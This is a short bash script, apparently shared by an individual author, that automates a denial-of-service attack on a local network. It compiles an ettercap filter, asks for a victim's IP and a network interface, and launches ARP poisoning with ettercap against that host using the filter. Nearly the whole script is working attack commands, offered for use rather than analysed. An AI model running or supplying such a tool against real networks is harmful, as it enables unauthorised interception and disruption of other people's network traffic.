#!/bin/bash
# Dos Attack Autorun
# By Marti157

# Everything will be done in the directory from where this
# script is run

echo "Checking if DosAttack.elt exists…"

if [ ! -f DosAttack.elt ]; then
    echo "File not found!"
    echo "Please download from repository and place in current directory."
else
    if [ ! -f DosAttack.ef ]; then
        echo "File found but not compiled. Compiling…"
        etterfilter DosAttack.elt -o DosAttack.ef
        echo "Compiled. Starting attack…"
        echo "Enter Victim’s IP:"
        read ipadress
        echo "Enter network interface:"
        read netinterface
        echo "Starting attack…."
        sudo ettercap -i $netinterface -T -q -F DosAttack.ef -M ARP /$ipadress//
    else
        echo "File found but already compiled! Removing file and recompiling..."
        sudo rm DosAttack.ef
        etterfilter DosAttack.elt -o DosAttack.ef
        echo "Enter Victim’s IP:"
        echo "Starting attack..."
        read ipadress
        echo "Enter network interface:"
        read netinterface
        echo "Starting attack…."
        sudo ettercap -i $netinterface -T -q -F DosAttack.ef -M ARP /$ipadress//
    fi
fi